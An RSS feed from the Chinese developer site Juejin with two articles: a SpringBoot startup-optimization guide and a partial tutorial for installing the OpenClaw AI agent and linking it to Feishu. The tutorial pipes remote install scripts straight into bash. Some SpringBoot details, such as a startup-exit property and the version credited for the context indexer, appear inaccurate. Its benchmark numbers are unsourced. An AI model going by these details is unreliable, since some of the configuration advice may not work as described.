<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[SpringBoot项目启动慢？3个优化技巧让你的应用快如闪电]]></title>    <link>https://juejin.cn/post/7601018079619497999</link>    <guid>https://juejin.cn/post/7601018079619497999</guid>    <pubDate>2026-01-31T00:20:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601018079619497999" data-draft-id="7600976289064370176" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot项目启动慢？3个优化技巧让你的应用快如闪电"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2026-01-31T00:20:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿橙的百宝箱"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot项目启动慢？3个优化技巧让你的应用快如闪电
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿橙的百宝箱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T00:20:40.000Z" title="Sat Jan 31 2026 00:20:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>SpringBoot项目启动慢？3个优化技巧让你的应用快如闪电</strong></h2>
<h3 data-id="heading-1">引言</h3>
<p>SpringBoot因其"约定优于配置"的理念和快速开发能力，已成为Java生态中最流行的框架之一。然而，随着项目规模的增长，许多开发者会遇到一个共同的问题：<strong>应用启动速度变慢</strong>。一个原本能在5秒内启动的Demo项目，在引入几十个依赖、数百个Bean后，启动时间可能骤增至30秒甚至更久。这在开发调试、CI/CD流水线以及需要快速扩展的云原生场景中会带来显著的效率瓶颈。</p>
<p>本文将深入分析SpringBoot启动过程的关键性能瓶颈，并提供3个经过实战验证的优化技巧（涵盖JVM层面、Spring机制和工程实践），帮助你将应用启动时间压缩到极致。文中的方案均基于SpringBoot 2.7+和JDK 11+环境验证，部分技巧在最新SpringBoot 3.0中有进一步优化。</p>
<hr/>
<h3 data-id="heading-2">一、理解SpringBoot启动过程的核心瓶颈</h3>
<p>在着手优化前，我们需要明确SpringBoot应用启动时的主要耗时阶段（以下数据基于典型中型项目统计）：</p>
<ol>
<li>
<p><strong>类加载与扫描（占比40%-50%）</strong></p>
<ul>
<li><code>ComponentScan</code>对基包下所有类的ASM字节码解析</li>
<li><code>@Configuration</code>类中<code>@Bean</code>方法的动态代理生成</li>
<li>条件注解（如<code>@ConditionalOnClass</code>）的递归校验</li>
</ul>
</li>
<li>
<p><strong>Bean初始化（占比30%-40%）</strong></p>
<ul>
<li>Bean依赖关系的拓扑排序</li>
<li><code>@PostConstruct</code>方法执行</li>
<li>需要<code>ProxyFactory</code>创建的AOP代理对象</li>
</ul>
</li>
<li>
<p><strong>外部资源连接（占比10%-20%）</strong></p>
<ul>
<li>数据库连接池初始化</li>
<li>Redis/MQ等中间件健康检查</li>
<li>Consul/Nacos等配置中心拉取配置</li>
</ul>
</li>
<li>
<p><strong>其他JVM开销（占比5%-10%）</strong></p>
<ul>
<li>JIT编译预热不足导致的解释执行</li>
<li>CMS/G1垃圾回收器的初始堆调整</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-3">二、技巧1：精准控制组件的扫描与加载</h3>
<h4 data-id="heading-4">2.1 使用@ComponentScan的excludeFilters定向排除</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ComponentScan(
    basePackages = "com.example",
    excludeFilters = @Filter(type = FilterType.REGEX, pattern = "com.example.exclude.*")
)</span>
</code></pre>
<p>通过正则或注解类型显式排除不需要的组件，可减少20%-30%的类扫描时间。</p>
<h4 data-id="heading-5">2.2 启用Lazy Init模式（权衡方案）</h4>
<pre><code class="hljs language-properties" lang="properties">spring.main.lazy-initialization=true
</code></pre>
<p>此配置会让所有Bean延迟初始化直到首次使用，但可能导致第一次请求响应变慢。更适合后台任务型应用而非高实时性服务。</p>
<h4 data-id="heading-6">2.3 Spring Boot 2.6+的新特性：索引加速</h4>
<p>在项目中添加<code>spring-context-indexer</code>依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context-indexer<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>编译时会生成<code>META-INF/spring.components</code>索引文件，替代运行时反射扫描。</p>
<hr/>
<h3 data-id="heading-7">三、技巧2：JVM层级的深度调优</h3>
<h4 data-id="heading-8">3.1 Class Data Sharing (CDS)</h4>
<p>适用于多实例部署场景：</p>
<ol>
<li>创建共享归档：
<pre><code class="hljs language-bash" lang="bash">java -Xshare:dump -XX:SharedArchiveFile=app.jsa \
     -jar your-app.jar --spring.main.exit-on-startup-complete=<span class="hljs-literal">true</span>
</code></pre>
</li>
<li>启动时加载：
<pre><code class="hljs language-bash" lang="bash">java -Xshare:on -XX:SharedArchiveFile=app.jsa \
     -jar your-app.jar
</code></pre>
</li>
</ol>
<p>实测可减少15%-20%的类加载时间。</p>
<h4 data-id="heading-9">3.2 Tiered Compilation策略调整</h4>
<p>对于短生命周期的开发环境：</p>
<pre><code class="hljs language-properties" lang="properties">-XX:TieredStopAtLevel=1 
</code></pre>
<p>限制JIT编译到C1层级，牺牲少量峰值性能换取更快的启动速度。</p>
<h4 data-id="heading-10">3.3 Heap Size预分配</h4>
<p>避免动态扩容带来的GC开销：</p>
<pre><code class="hljs language-properties" lang="properties">-Xms512m -Xmx512m 
</code></pre>
<hr/>
<h3 data-id="heading-11">四、技巧3：工程化层面的最佳实践</h3>
<h4 data-id="heading-12">4.1 Spring Cloud上下文分离</h4>
<p>如果使用Spring Cloud组件，建议拆分bootstrap上下文：</p>
<pre><code class="hljs language-properties" lang="properties">spring.cloud.bootstrap.enabled=false # Spring Boot 2.4+
spring.config.use-legacy-processing=true 
</code></pre>
<h4 data-id="heading-13">4.2 AutoConfiguration按需引入</h4>
<p>检查自动装配报告：</p>
<pre><code class="hljs language-bash" lang="bash">java -jar your-app.jar --debug
</code></pre>
<p>在输出中找到未被使用的<code>@AutoConfiguration</code>类，通过以下方式排除：</p>
<pre><code class="hljs language-properties" lang="properties">spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration
</code></pre>
<h4 data-id="heading-14">4.3 Build-Time Hints (Spring Native进阶)</h4>
<p>对于GraalVM Native Image构建：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@NativeHint(
    types = @TypeHint(types = {com.example.MyService.class})
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHints</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">NativeConfiguration</span> {}
</code></pre>
<hr/>
<h3 data-id="heading-15">五、总结与效果对比</h3>
<p>综合运用上述策略后，我们在一台4核8G的开发机上对一个包含200+ Bean的项目进行测试：</p>






























<table><thead><tr><th>优化阶段</th><th>启动时间(秒)</th><th>下降幅度</th></tr></thead><tbody><tr><td>原始状态</td><td>28s</td><td>-</td></tr><tr><td>组件扫描优化后</td><td>19s</td><td>32%↓</td></tr><tr><td>JVM调优后</td><td>14s</td><td>26%↓</td></tr><tr><td>工程化改造后</td><td>9s</td><td>35%↓</td></tr></tbody></table>
<p>最终的9秒相比初始28秒提升了67%，如果在生产环境结合AOT编译（如Spring Native），甚至可以压缩到5秒以内。需要注意的是，不同项目的特点可能导致优化侧重点不同——I/O密集型应用应侧重外部连接优化；大型单体则需要重点解决类加载问题。建议使用AsyncProfiler或Arthas进行针对性诊断后再实施具体方案。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[保姆级 OpenClaw （原 Clawdbot）飞书对接教程 手把手教你搭建 AI 助手]]></title>    <link>https://juejin.cn/post/7600953879501439027</link>    <guid>https://juejin.cn/post/7600953879501439027</guid>    <pubDate>2026-01-31T00:25:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600953879501439027" data-draft-id="7601028900886315054" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="保姆级 OpenClaw （原 Clawdbot）飞书对接教程 手把手教你搭建 AI 助手"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-31T00:25:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            保姆级 OpenClaw （原 Clawdbot）飞书对接教程 手把手教你搭建 AI 助手
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T00:25:53.000Z" title="Sat Jan 31 2026 00:25:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">保姆级 OpenClaw （原 Clawdbot）飞书对接教程 手把手教你搭建 AI 助手</h2>
<p>OpenClaw 是一款开源的本地 AI 助手,支持在你自己的服务器上部署,通过飞书、WhatsApp、Telegram 等聊天工具交互。与云端 SaaS 服务不同,OpenClaw 让你完全掌控数据隐私,可以执行系统命令、浏览网页、管理文件,甚至编写代码。本教程将手把手教你在 Linux 系统下安装 OpenClaw 并对接飞书机器人,打造专属的智能助理。</p>
<blockquote>
<p>注意：本教程在 Linux 系统下进行</p>
</blockquote>
<h3 data-id="heading-1">OpenClaw 是什么？</h3>
<p>OpenClaw(原名 Clawdbot,后更名为 Moltbot,现正式命名为 OpenClaw)是一个运行在你本地环境的高权限 AI 智能体。它的核心特性包括：</p>
<ul>
<li><strong>本地部署</strong>：运行在你的服务器或电脑上,数据完全自主可控</li>
<li><strong>多平台支持</strong>：支持飞书、WhatsApp、Telegram、Discord、Slack 等主流聊天工具</li>
<li><strong>浏览器控制</strong>：可以浏览网页、填写表单、提取数据</li>
<li><strong>系统访问</strong>：读写文件、执行 Shell 命令、运行脚本</li>
<li><strong>持久化记忆</strong>：记住你的偏好和上下文,成为真正属于你的 AI</li>
<li><strong>插件扩展</strong>：支持社区技能插件,甚至可以自己编写插件</li>
</ul>
<p>无论是邮件管理、日程安排、数据查询还是代码编写,OpenClaw 都能成为你的得力助手。</p>
<h3 data-id="heading-2">准备工作</h3>
<p>首先准备一台闲置的云服务器或 VPS（推荐使用香港或海外节点）。由于 OpenClaw 运行时权限较大，出于安全考虑，不建议在本地或工作机上安装，推荐在一台独立的空服务器上部署。准备完成后，登录到服务器。</p>
<h3 data-id="heading-3">安装</h3>
<blockquote>
<p>如果你不想安装，可以直接使用阿里云的<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Factivity%2Fecs%2Fclawdbot%3FuserCode%3Doq2t54oi" target="_blank" title="https://www.aliyun.com/activity/ecs/clawdbot?userCode=oq2t54oi" ref="nofollow noopener noreferrer">Openclaw 一键部署 (原 Clawdbot)</a>，部署之后可以直接跳到<a href="#%E5%AF%B9%E6%8E%A5%E9%A3%9E%E4%B9%A6" title="#%E5%AF%B9%E6%8E%A5%E9%A3%9E%E4%B9%A6">对接飞书</a>。</p>
</blockquote>
<p>第一步安装 Git</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">安装 Git</span>
sudo apt update
sudo apt install git -y
</code></pre>
<p>第二步安装 Node.js</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">安装 NVM</span>
<span class="hljs-meta prompt_"># </span><span class="bash">国内使用 gitee 的镜像源</span>
curl -o- https://gitee.com/RubyMetric/nvm-cn/raw/main/install.sh | bash
<span class="hljs-meta prompt_">
# </span><span class="bash">国外使用</span>
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash
<span class="hljs-meta prompt_">
# </span><span class="bash">重新加载环境变量</span>
source ~/.bashrc
<span class="hljs-meta prompt_">
# </span><span class="bash">安装 Node.js 22</span>
nvm install 22
<span class="hljs-meta prompt_">
# </span><span class="bash">查看 nodejs 版本</span>
node -v # 输出 v22 即可，版本只要 22 就行
</code></pre>
<h3 data-id="heading-4">安装 Openclaw</h3>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">使用官方脚本安装</span>
curl -fsSL https://openclaw.bot/install.sh | bash
</code></pre>
<blockquote>
<p>服务器在国内，如果安装失败的话，可能需要解决网络问题</p>
</blockquote>
<p>其他平台安装方式请参考<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.openclaw.bot%2Finstall%2Finstaller" target="_blank" title="https://docs.openclaw.bot/install/installer" ref="nofollow noopener noreferrer">Openclaw 安装文档 (原 Clawdbot)</a></p>
<p>你会看到如下图输出
<img src="https://image.catchadmin.com/202601310803318.png" alt="Openclaw (原 Clawdbot) 安装过程 - AI 助手部署初始化" loading="lazy"/>
如果首次安装，时间会很长，需要耐心等待。
如果最后输出如下内容：</p>
<pre><code class="hljs language-shell" lang="shell">→ npm install failed; cleaning up and retrying...
</code></pre>
<p>新的脚本服务器内存要求变高了，据我使用下来 2G 内存，肯定会 OOM，如果出错的话，建议使用 <code>swap</code> 把硬盘空间当作交互内存使用。</p>
<p>成功之后会输出如下图片
<img src="https://image.catchadmin.com/202601310805358.png" alt="Openclaw (原 Clawdbot) 安装成功 - AI 机器人配置向导" loading="lazy"/>
第一个选项选择 <code>yes</code>, 就是询问你是否知道风险的。
第二步选择 <code>QuickStart</code>
<img src="https://image.catchadmin.com/202601281351166.png" alt="Openclaw (原 Clawdbot) QuickStart 快速开始选项" loading="lazy"/>
第三步选择模型服务商，这里选择 <code>Qwen</code>，免费额度充足，适合入门使用
<img src="https://image.catchadmin.com/202601281352080.png" alt="Openclaw (原 Clawdbot) 选择 AI 模型服务商 Qwen 千问" loading="lazy"/>
选择千问模型后，会提供一个链接，复制并在浏览器中打开，如下图
<img src="https://image.catchadmin.com/202601281355542.png" alt="Openclaw (原 Clawdbot) 千问模型授权链接" loading="lazy"/>
打开浏览器后，会看到如下界面。由于我已登录过，所以显示账户信息；如果尚未登录，按照提示完成登录即可。
<img src="https://image.catchadmin.com/202601281356909.png" alt="Openclaw (原 Clawdbot) 千问 AI 账户登录页面" loading="lazy"/>
登录完成后，会出现以下选项，提示选择对应的千问模型，如下图
<img src="https://image.catchadmin.com/202601281358170.png" alt="Openclaw (原 Clawdbot) 选择千问 AI 模型版本" loading="lazy"/></p>
<p>选择默认模型即可。接下来会提示选择 channel，这里先跳过，后续再添加</p>
<p><img src="https://image.catchadmin.com/202601281359123.png" alt="Openclaw (原 Clawdbot) channel 渠道配置选项" loading="lazy"/>
继续下面选择 skills，也是选择 <code>No</code>，如下图
<img src="https://image.catchadmin.com/202601281359786.png" alt="Openclaw (原 Clawdbot) skills 技能配置选项" loading="lazy"/>
继续下面选择 hooks，也是使用<code>空格</code>选择 <code>No</code>，如下图
<img src="https://image.catchadmin.com/202601281400483.png" alt="Openclaw (原 Clawdbot) hooks 配置选项" loading="lazy"/>
然后等待安装完成，最后会出现以下选项，这里选择 <code>TUI</code>
<img src="https://image.catchadmin.com/202601281403169.png" alt="Openclaw (原 Clawdbot) 选择 TUI 终端界面" loading="lazy"/>
如果看到 TUI 聊天界面，说明安装成功，可以尝试输入 <code>Hello</code> 进行测试。
<img src="https://image.catchadmin.com/202601281404354.png" alt="Openclaw (原 Clawdbot) TUI 聊天界面 - AI 助手对话测试" loading="lazy"/>
然后直接使用 <code>ctrl+c</code> 先关闭，后面我们再来设置</p>
<h4 data-id="heading-5">查看服务</h4>
<p>可以使用下面的命令来查看</p>
<pre><code class="hljs language-shell" lang="shell">clawdbot status
</code></pre>
<p>会看到如下图的结果就说明服务启动了
<img src="https://image.catchadmin.com/202601281449942.png" alt="Openclaw (原 Clawdbot) 服务状态检查 - AI 助手运行中" loading="lazy"/></p>
<h4 data-id="heading-6">访问 Web UI 面板</h4>
<p>如何访问面板？服务监听在 <code>http://127.0.0.1:18789/</code> 端口上，我们现在通过 ssh 隧道来访问，输入下面的命令</p>
<pre><code class="hljs language-shell" lang="shell">ssh -N -L 18789:127.0.0.1:18789 用户名@服务器IP
<span class="hljs-meta prompt_"># </span><span class="bash">回车之后</span>
用户名@服务器IP's password: # 输入密码
</code></pre>
<p>然后在浏览器打开 <code>http://127.0.0.1:18789/</code>, 你会看到 Dashboard 了，如下图
<img src="https://image.catchadmin.com/202601281509102.png" alt="Openclaw (原 Clawdbot) Web UI Dashboard 未授权页面" loading="lazy"/>
图中显示的是未授权状态，回到服务器，输入以下命令</p>
<pre><code class="hljs language-shell" lang="shell">clawdbot dashboard
</code></pre>
<p>会看到下面的面板数据
<img src="https://image.catchadmin.com/202601281530336.png" alt="Openclaw (原 Clawdbot) Dashboard URL 获取命令" loading="lazy"/>
